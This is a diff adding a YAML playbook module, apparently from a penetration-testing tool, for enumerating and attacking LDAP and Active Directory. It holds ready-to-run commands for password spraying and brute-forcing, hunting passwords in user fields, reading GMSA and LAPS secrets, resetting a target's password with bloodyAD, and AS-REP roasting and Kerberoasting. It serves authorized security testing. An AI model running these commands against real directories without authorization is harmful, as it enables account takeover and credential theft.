@@ -1,0 +1,129 @@
+module: ldap
+name: LDAP (389 / 636 / 3268 / 3269)
+inputs: [USERS, PASS, DOMAIN, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version + default scripts
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script="ldap* and not brute" $IP
+      - id: naming_contexts
+        text: Anonymous base query (naming contexts / domain)
+        commands: |
+          ldapsearch -x -H ldap://$IP:$PORT -s base namingcontexts
+          ldapsearch -x -H ldap://$IP:$PORT -s base -b "" "(objectclass=*)"
+      - id: ldaps
+        text: Repeat over TLS (636 / 3269)
+        tls_only: true
+        commands: |
+          ldapsearch -x -H ldaps://$IP:$PORT -s base namingcontexts
+          openssl s_client -connect $IP:$PORT
+
+  - id: fingerprint
+    name: Anonymous Enumeration
+    steps:
+      - id: dump_all
+        text: Anonymous full dump (if bind allowed)
+        commands: |
+          ldapsearch -x -H ldap://$IP:$PORT -b "DC=$DOMAIN" "(objectclass=*)"
+          nmap -p$PORT --script=ldap-rootdse $IP
+      - id: users
+        text: Enumerate users
+        commands: |
+          ldapsearch -x -H ldap://$IP:$PORT -b "DC=$DOMAIN" "(objectClass=user)" sAMAccountName
+          nmap -p$PORT --script=ldap-search --script-args='ldap.base="dc=$DOMAIN"' $IP
+      - id: groups
+        text: Enumerate groups / computers
+        commands: |
+          ldapsearch -x -H ldap://$IP:$PORT -b "DC=$DOMAIN" "(objectClass=group)" cn
+          ldapsearch -x -H ldap://$IP:$PORT -b "DC=$DOMAIN" "(objectClass=computer)" name
+      - id: descriptions
+        text: Hunt passwords in description / info fields
+        commands: |
+          ldapsearch -x -H ldap://$IP:$PORT -b "DC=$DOMAIN" "(objectClass=user)" description info
+
+  - id: authed
+    name: Authenticated Enumeration
+    steps:
+      - id: bind
+        text: Authenticated bind
+        commands: |
+          ldapsearch -x -H ldap://$IP:$PORT -D "$USER@$DOMAIN" -w '$PASS' -b "DC=$DOMAIN" "(objectclass=*)"
+      - id: windapsearch
+        text: Structured enum (windapsearch / ldapdomaindump)
+        commands: |
+          windapsearch -d $DOMAIN --dc-ip $IP -u $USER -p $PASS -U
+          ldapdomaindump -u "$DOMAIN\\$USER" -p '$PASS' ldap://$IP -o $OUT
+      - id: interesting
+        text: AS-REP / SPN / delegation / admincount via LDAP
+        manual: true
+        commands: |
+          # (userAccountControl:1.2.840.113556.1.4.803:=4194304)  -> AS-REP roastable
+          # (servicePrincipalName=*)                              -> kerberoastable
+          # (userAccountControl:1.2.840.113556.1.4.803:=524288)   -> unconstrained deleg
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: signing
+        text: Check LDAP signing / channel binding (relay surface)
+        commands: |
+          nmap -p$PORT --script=ldap-rootdse $IP
+          nxc ldap $IP -u '' -p '' -M ldap-checker
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit openldap
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: anon_bind
+        text: Test anonymous / null bind
+        commands: |
+          ldapsearch -x -H ldap://$IP:$PORT -b "DC=$DOMAIN"
+      - id: brute
+        text: Credential brute-force / spray
+        commands: |
+          nmap -p$PORT --script=ldap-brute --script-args ldap.base='"cn=users,dc=$DOMAIN"' $IP
+          nxc ldap $IP -u $USERLIST -p $PASSLIST --continue-on-success
+          hydra -L $USERLIST -P $PASSLIST ldap2://$IP -s $PORT
+
+  - id: post
+    name: Cross-reference & Post-Access
+    steps:
+      - id: bloodhound
+        text: Feed LDAP data into BloodHound (see Active Directory tab)
+        commands: |
+          nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All --dns-server $IP
+      - id: bloodyad
+        text: Enumerate + abuse writable objects (BloodyAD)
+        commands: |
+          bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $IP get writable
+          bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $IP set password <target> 'NewP@ss1'
+      - id: notes
+        text: Note quick wins (readable GMSA, LAPS, ACLs)
+        manual: true
+        commands: |
+          nxc ldap $IP -u $USER -p $PASS --gmsa
+          # LAPS: ms-Mcs-AdmPwd readable?  ACLs: use BloodHound
+
+  - id: exploit
+    name: Exploitation
+    authorized: true
+    steps:
+      - id: dump
+        text: "Anonymous / authenticated dump"
+        commands: |
+          ldapsearch -x -H ldap://$IP -b "dc=$DOMAIN" -s sub "(objectclass=*)"
+          nxc ldap $IP -u $USER -p $PASS --asreproast asrep.txt --kerberoasting kerb.txt
+      - id: adnote
+        text: "Full AD attack paths -> Active Directory tab"
+        commands: |
+          # ASREPRoast / Kerberoast / BloodHound / ADCS from the AD playbook
